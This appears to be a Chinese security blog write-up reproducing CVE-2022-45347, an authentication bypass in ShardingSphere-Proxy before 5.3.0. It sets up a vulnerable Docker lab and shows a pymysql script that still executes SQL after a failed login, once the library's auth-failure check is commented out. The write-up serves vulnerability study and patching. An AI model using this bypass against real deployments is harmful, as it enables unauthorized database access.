**漏洞编号：** CVE-2022-45347

 **公开日期：** 2022.12.22

 **漏洞描述：** ShardingSphere-Proxy在进行MySQL客户端认证失败后，没有彻底清除会话，攻击者可以通过构造一个特殊（认证失败也不会关闭客户端）的mysql客户端来绕过身份认证执行sql语句。

 **影响范围：** ShardingSphere-Proxy<5.3.0

 **修复建议：** 该漏洞在 ShardingSphere 5.3.0 版本已经修复

##  **漏洞复现**

###  **1.搭建环境**

官方文档有介绍可以通过docker快速启动

我们这里选择漏洞版本5.2.1

docker pull apache/shardingsphere-proxy:5.2.1

（官方文档有三种获取docker镜像等方式，这里只介绍第一种，其他的参考官方文档

<https://shardingsphere.apache.org/document/current/cn/user-manual/shardingsphere-proxy/startup/docker/>）

###  **2.配置server.yaml和config-sharding.yaml**

我们从docker容器内获取配置文件模版，拷贝到宿主机任意目录中：

docker run -d --name tmp --entrypoint=bash apache/shardingsphere-proxy

docker cp tmp:/opt/shardingsphere-proxy/conf /host/path/to/conf

docker rm tmp

来到拷贝的conf目录下

![](https://image.3001.net/images/20221223/1671785147_63a56abb6ed7364754ff6.png!small)

更改server.yaml和config-sharding.yaml文件

server.yaml

这里配置链接shardingsphere-proxy服务端的账号密码root/root

![](https://image.3001.net/images/20221223/1671785174_63a56ad6016154e0a2f69.png!small)

config-sharding.yaml

这里配置链接的mysql数据库信息，

![](https://image.3001.net/images/20221223/1671785193_63a56ae9e08f7e16bb47a.png!small)

###  **3.引入第三方依赖**

因为ShardingSphere-Proxy 后端连接 PostgreSQL 或 openGauss 数据库，不需要引入额外依赖。

而连接MYSQl数据库时，需要下载依赖 [mysql-connector-java-5.1.47.jar](https://repo1.maven.org/maven2/mysql/mysql-connector-java/5.1.47/mysql-connector-java-5.1.47.jar)或者 [mysql-connector-java-8.0.11.jar](https://repo1.maven.org/maven2/mysql/mysql-connector-java/8.0.11/mysql-connector-java-8.0.11.jar)，并将其放入ext-lib 目录下（ext-lib目录可在任意位置创建）

###  **4.启动ShardingSphere-Proxy 容器**

将宿主机中的 conf 与 ext-lib 目录挂载到容器中，启动容器：

docker run -d

-v /host/path/to/conf:/opt/shardingsphere-proxy/conf

-v /host/path/to/ext-lib:/opt/shardingsphere-proxy/ext-lib

-e PORT=3308 -p13308:3308 apache/shardingsphere-proxy:latest

###  **5.构造一个特殊的mysql客户端**

根据漏洞描述里可知，ShardingSphere-Proxy在进行mysql客户端连接认证失败后没有彻底清除会话导致的身份验证绕过，

mysql连接时，如果认证失败，会关闭客户端，那如果我们构造一个认证失败也没有关闭的客户端，不就可以用未清除的session连接到ShardingSphere-Proxy服务端，并执行sql语句。

首先用python构造一个连接数据库的脚本 test.py，代码如下：

这里是专门把密码写错，前面设置的时候，我们设置的密码为root，这里为root1

>  
>
>  
>  
>     #!/usr/bin/python3  
>     >  
>     > import pymysql  
>     >  
>     > # 打开数据库连接  
>     > db = pymysql.connect(host='127.0.0.1',  
>     > user='root',  
>     > password='root1',  
>     > port=13308)  
>     >  
>     > # 使用 cursor() 方法创建一个游标对象 cursor  
>     > cursor = db.cursor()  
>     >  
>     > # 使用 execute()  方法执行 SQL 查询  
>     > cursor.execute("SELECT version()")  
>     >  
>     > # 使用 fetchone() 方法获取单条数据.  
>     > data = cursor.fetchone()  
>     >  
>     > print("Database version : %s " % data)  
>     >  
>     > # 关闭数据库连接  
>     > db.close()

然后来到pymysql库的connections文件

![](https://image.3001.net/images/20221223/1671785223_63a56b072a026b60ed850.png!small)

（图片为pymysql 1.0.2版本的源码）

可以看到圈起来的为判断连接失败后的代码，我们把这里的代码注释掉，让其不判断是否连接成功，直接return。

来到我们构造的test.py,运行，结果如下：

![](https://image.3001.net/images/20221223/1671784591_63a5688f470774baa8b43.png!small)

成功访问数据库版本。

参考链接：

<https://nvd.nist.gov/vuln/detail/CVE-2022-45347>

<https://github.com/apache/shardingsphere>

<https://shardingsphere.apache.org/document/current/cn/quick-start/shardingsphere-proxy-quick-start/>

